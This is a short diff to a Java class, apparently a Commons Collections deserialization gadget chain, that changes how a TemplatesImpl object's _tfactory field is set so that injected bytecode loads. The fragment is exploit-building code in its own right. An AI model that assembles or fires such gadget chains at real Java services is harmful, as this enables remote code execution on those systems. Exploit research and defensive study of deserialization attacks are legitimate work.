@@ -245,7 +245,7 @@ public class CommonsCollectionsGadget2 {
         _tfactory.setAccessible(true);
         _name.set(templates, "h3rmesk1t");
         _bytecode.set(templates, targetByteCodes);
-        _tfactory.set(templates, null);
+        _tfactory.set(templates, new TransformerFactoryImpl());
 
         TransformingComparator transformingComparator = new TransformingComparator(transformer);
         PriorityQueue priorityQueue = new PriorityQueue(2);
